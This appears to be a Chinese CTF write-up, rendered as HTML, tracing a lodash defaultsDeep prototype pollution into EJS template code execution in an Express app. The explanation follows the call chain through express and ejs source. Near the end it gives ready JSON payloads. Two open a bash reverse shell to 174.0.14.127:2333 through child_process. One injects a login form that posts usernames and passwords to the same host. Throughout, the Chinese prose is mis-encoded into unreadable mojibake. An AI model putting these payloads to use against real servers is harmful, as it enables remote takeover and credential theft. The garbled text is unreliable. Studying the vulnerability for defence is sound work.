<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…è®¸äº†æˆ‘ä»¬é€šè¿‡JSONæ ¼å¼å‘æœåŠ¡å™¨ä¼ é€’å‚æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.set(&#39;json escape&#39;,true)</span><br><span class="line">app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;ejs&#39;)</span><br></pre></td></tr></table></figure>

<p>è§†å›¾æ˜¯é€šè¿‡<code>ejs</code> æ¨¡æ¿æ¸²æŸ“çš„</p>
<p>è¿™ä¸ªæœåŠ¡å™¨æ˜¯<code>Node.js</code> é‡‡ç”¨äº†<code>express</code> æ¡†æ¶â€¦.  æœ‰ç‚¹æ…Œäº†æ˜¯ä¸æ˜¯</p>
<h3 id="æ¼æ´æ¢æµ‹"><a href="#æ¼æ´æ¢æµ‹" class="headerlink" title="æ¼æ´æ¢æµ‹"></a>æ¼æ´æ¢æµ‹</h3><p>åœ¨<code>server.js</code>  çš„<code>/get</code> è·¯ç”±ä¸­: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415171558.png"></p>
<p>å½“æŸ¥è¯¢çš„ç»“æœè¶…è¿‡äº”æ¡, é‚£ä¹ˆå°±ä¼š<code>merge</code> åˆå¹¶æˆä¸º1æ¡, å…·ä½“çš„è¿‡ç¨‹å°±æ˜¯ä»mysqlä¸­ä¸€æ¡ä¸€æ¡çš„æŸ¥è¯¢å½“å‰ç”¨æˆ·çš„æ‰€æœ‰æ•°æ®, ç„¶åä¸€æ¡ä¸€æ¡çš„åˆå¹¶</p>
<p>å…¶ä¸­çš„</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">     lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br></pre></td></tr></table></figure>

<p>æ­£å¥½æ˜¯<code>lodash</code> åº“çš„ä¸€ä¸ªåŸå‹é“¾æ¼æ´çš„æ”»å‡»å¯¹è±¡</p>
<blockquote>
<p>é€šè¿‡æ„é€ å‡½æ•°é‡è½½çš„æ–¹å¼ï¼ŒLodash åº“ä¸­çš„å‡½æ•° defaultsDeep å¾ˆæœ‰å¯èƒ½ä¼šè¢«æ¬ºéª—æ·»åŠ æˆ–ä¿®æ”¹ Object.prototype çš„å±æ€§ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´ Web åº”ç”¨ç¨‹åºå´©æºƒæˆ–æ”¹å˜å…¶è¡Œä¸ºï¼Œå…·ä½“å–å†³äºå—å½±å“çš„ç”¨ä¾‹ã€‚</p>
</blockquote>
<p>å‚è€ƒçš„å¸ˆå‚…è¯´ æŸ¥çœ‹äº†ç‰ˆæœ¬åˆšå¥½æ˜¯<code>4.17.11</code> æˆ‘ä¸çŸ¥é“ä»–æ˜¯æ€ä¹ˆçœ‹çš„â€¦ âœ–</p>
<p>åœ¨<code>package.json</code> ä¸­å¯ä»¥çœ‹åˆ°è¿™äº›é…ç½®çš„ç‰ˆæœ¬ä¿¡æ¯ âœ”</p>
<hr>
<p>æ—¢ç„¶è¦ä¼ªé€ adminçš„èº«ä»½, é‚£ä¹ˆå°±åº”è¯¥æŠŠçœ¼å…‰æ”¾åœ¨session cookie ä»¥åŠ è®¤è¯çš„ä»£ç ä¸Š.</p>
<p>åœ¨<code>server.js</code> ä¸­, <code>auth</code> å‡½æ•°</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// var session = req.session;</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.login || !req.session.userid )&#123;</span><br><span class="line">        res.redirect(<span class="number">302</span>,<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“, åœ¨æ²¡æœ‰ç™»é™†çš„æ—¶å€™, æ˜¯ä¸å­˜åœ¨sessionçš„, ä¹Ÿå°±æ˜¯è¯´ <code>req.session.login</code> ä»¥åŠ <code>req.session.userid</code>  æ˜¯ undefinded </p>
<p>è€Œsession å¯¹è±¡çš„çˆ¶ç±»è‚¯å®šåŒ…å«äº†<code>Object</code> , æ•…æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹Object ä¸­çš„è¿™éƒ¨åˆ†ä»£ç å°±å¯ä»¥ç»•è¿‡ç™»å½•, ä»¥adminçš„èº«ä»½è®¿é—®é¡µé¢(åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“)</p>
<p>å®¡è®¡<code>server.js</code> å¯ä»¥çŸ¥é“, æ‰€æœ‰çš„ç»“æœéƒ½æ˜¯é€šè¿‡<code>res.render</code> æ¥è¿›è¡Œæ¸²æŸ“çš„, <strong>é‚£ä¹ˆå°è¯•ä»è¿™é‡Œå…¥æ‰‹, è·Ÿè¿›æ¨¡æ¿æ¸²æŸ“çš„è¿‡ç¨‹æ¥å¯»æ‰¾ç¬¦åˆä¸Šé¢æ¡ä»¶çš„åˆ©ç”¨ç‚¹</strong></p>
<p>é€šè¿‡è·Ÿè¿›<code>/login</code> çš„<code>res.render</code>  , æˆ‘è¿™é‡Œæ²¡åŠæ³•è·Ÿè¿›å•Š??!</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200415180136.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200303222123.jpg"></p>
<p>ä¸ºäº†å¤ç°è¿‡ç¨‹çš„å®Œæ•´æ€§, é‚£ä¹ˆå°±çœ‹ç€wpç»§ç»­èµ°ä¸‹å»å§, ä¸‹é¢çš„å†…å®¹ç›´æ¥CTRL C/V</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="built_in">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="built_in">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line"></span><br><span class="line">  ....</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°æ¥åˆ°äº†<code>response.js</code>çš„ä¸­å¯¹<code>res.render</code>çš„å®šä¹‰ï¼Œå¹¶ä¸”è°ƒç”¨äº†<code>app.render</code>ï¼ŒåŒæ—¶ï¼Œå°†è¿›è¡Œäº†å‚æ•°é…ç½®ä¼ é€’ã€‚ç»§ç»­è·Ÿè¿›ï¼Œæ¥åˆ°<code>application.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="built_in">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="built_in">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line">  ....</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è°ƒç”¨äº†<code>tryRender</code>ï¼Œå¹¶ç»§ç»­ä¼ é€’é…ç½®ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†<code>view.render</code>ï¼Œç»§ç»­è·Ÿè¿›å°±æ¥åˆ°äº†<code>view.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="built_in">this</span>.path);</span><br><span class="line">  <span class="built_in">this</span>.engine(<span class="built_in">this</span>.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†<code>engine</code>ï¼Œç»ˆäºæ¥åˆ°äº†æ¨¡æ¿æ¸²æŸ“å¼•æ“<code>ejs.js</code>ä¸­ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è·³åˆ°<code>renderFile</code>å‡½æ•°ï¼Œå¹¶ä¸”åˆè°ƒç”¨äº†<code>tryHandleCache</code>ï¼Œæˆ‘è¿™é‡Œçœç•¥äº†optsä¼ é€’çš„ä»£ç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  ...</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>handleCache</code>è¿”å›äº†ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”å°†dataä¼ å…¥è¿›è¡Œæ‰§è¡Œï¼Œè€Œè¿™ä¸ªresultå°±æ˜¯æœ€åç”Ÿæˆçš„é¡µé¢äº†ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥æ„Ÿè§‰åˆ°ï¼Œæœ‰RCEçš„å¯èƒ½æ€§ã€‚ç»§ç»­è·Ÿè¿›ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line">  ...</span><br><span class="line">  func = <span class="built_in">exports</span>.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    <span class="built_in">exports</span>.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›ç”Ÿæˆfuncçš„<code>compile</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.compile = <span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params">template, opts</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> templ;</span><br><span class="line">  ...</span><br><span class="line">  templ = <span class="keyword">new</span> Template(template, opts);</span><br><span class="line">  <span class="keyword">return</span> templ.compile();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ–°å»ºäº†ä¸€ä¸ªTemplateå¯¹è±¡å¹¶æ‰§è¡Œå…¶æˆå‘˜æ–¹æ³•å¾—åˆ°è¿”å›çš„funcã€‚æˆ‘ä»¬è·Ÿè¿›å…¶æˆå‘˜æ–¹æ³•<code>compile</code>æŸ¥çœ‹</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">compile: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> src;</span><br><span class="line">    <span class="keyword">var</span> fn;</span><br><span class="line">    <span class="keyword">var</span> opts = <span class="built_in">this</span>.opts;</span><br><span class="line">    <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.source) &#123;</span><br><span class="line">      <span class="built_in">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.localsName + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="built_in">this</span>.source = prepended + <span class="built_in">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">      src = <span class="built_in">this</span>.source;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;return (async function()&#123;&#125;).constructor;&#x27;</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;This environment does not support async/await&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="built_in">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç ä¸­</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯æˆ‘ä»¬ä¸€ç›´å¯»æ‰¾çš„ä¸œè¥¿ï¼Œè¿™ä¸ªå¯¹è±¡ä¼šä¸å…¶ä»–ç”Ÿæˆçš„æ¨¡æ¿å­—ç¬¦ä¸²ä¸€èµ·æ‹¼æ¥åˆ°<code>this.source</code>ï¼Œç„¶åä¼ é€’ç»™<code>src</code>ï¼Œæ¥ç€æ˜¯<code>fn</code>ï¼Œç„¶åä»¥<code>returnedFn</code>è¿”å›å¹¶æœ€åè¢«æ‰§è¡Œã€‚è€Œä¸€è·¯è·Ÿè¿›çš„æ—¶å€™å¯ä»¥å‘ç°ï¼Œå¹¶<strong>æ²¡æœ‰</strong><code>outputFunctionName</code>çš„èº«å½±ï¼Œæ‰€ä»¥åªè¦ç»™Objectçš„<code>prototype</code>åŠ ä¸Šè¿™ä¸ªæˆå‘˜(å±æ€§)ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCEçš„æ”»å‡»è¿‡ç¨‹äº†ï¼</p>
<h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><h4 id="jsåŸå‹é“¾åˆ°RCE"><a href="#jsåŸå‹é“¾åˆ°RCE" class="headerlink" title="jsåŸå‹é“¾åˆ°RCE"></a>jsåŸå‹é“¾åˆ°RCE</h4><p>é¢˜ç›®ç¯å¢ƒæ˜¯å¯ä»¥è®¿é—®<code>process</code> çš„(å¯ä»¥ç”¨æ¥è¿›è¡Œåå¼¹shell), è€Œè¿™é‡Œçš„ç¯å¢ƒä¸è¡Œ..</p>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;content&quot;: &#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;: &quot;fuck&quot;, &quot;content&quot;: &#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&lt;&amp;1 2&gt;&amp;1\&quot;&#39;); &#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;logger&quot;:&quot;&lt;form action&#x3D;&#39;http:&#x2F;&#x2F;174.0.14.127:2333&#39; method&#x3D;&#39;post&#39; class&#x3D;&#39;am-form&#39;&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; id&#x3D;&#39;email&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;password&#39; name&#x3D;&#39;password&#39; id&#x3D;&#39;password&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;&#39; &gt;&lt;&#x2F;form&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–è§£æ³•: </p>
<h4 id="åˆ©ç”¨ejs-è¿›è¡Œ-rce"><a href="#åˆ©ç”¨ejs-è¿›è¡Œ-rce" class="headerlink" title="åˆ©ç”¨ejs è¿›è¡Œ rce"></a>åˆ©ç”¨ejs è¿›è¡Œ rce</h4><p>è§£æ³•ä¸€: </p>
<p>æŸ¥çœ‹ejsçš„æºç ï¼Œçœ‹åˆ°ä¸‹é¢ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (!this.source) &#123;</span><br><span class="line">  this.generateSource();</span><br><span class="line">  prepended +&#x3D; &#39;  var __output &#x3D; [], __append &#x3D; __output.push.bind(__output);&#39; + &#39;\n&#39;;</span><br><span class="line">  if (opts.outputFunctionName) &#123;</span><br><span class="line">    prepended +&#x3D; &#39;  var &#39; + opts.outputFunctionName + &#39; &#x3D; __append;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  if (opts._with !&#x3D;&#x3D; false) &#123;</span><br><span class="line">    prepended +&#x3D;  &#39;  with (&#39; + opts.localsName + &#39; || &#123;&#125;) &#123;&#39; + &#39;\n&#39;;</span><br><span class="line">    appended +&#x3D; &#39;  &#125;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  appended +&#x3D; &#39;  return __output.join(&quot;&quot;);&#39; + &#39;\n&#39;;</span><br><span class="line">  this.source &#x3D; prepended + this.source + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨çœ‹åé¢æ˜¯ä¸€ä¸ªåŠ¨æ€å‡½æ•°ç”Ÿæˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    ctor &#x3D; Function;</span><br><span class="line">  &#125;</span><br><span class="line">  fn &#x3D; new ctor(opts.localsName + &#39;, escapeFn, include, rethrow&#39;, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥éœ€è¦ä¼ªé€  <code>outputFunctionName</code> ä¸ºä¸€æ®µæ¶æ„ä»£ç ï¼Œå°±å¯ä»¥å®ç°rce ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
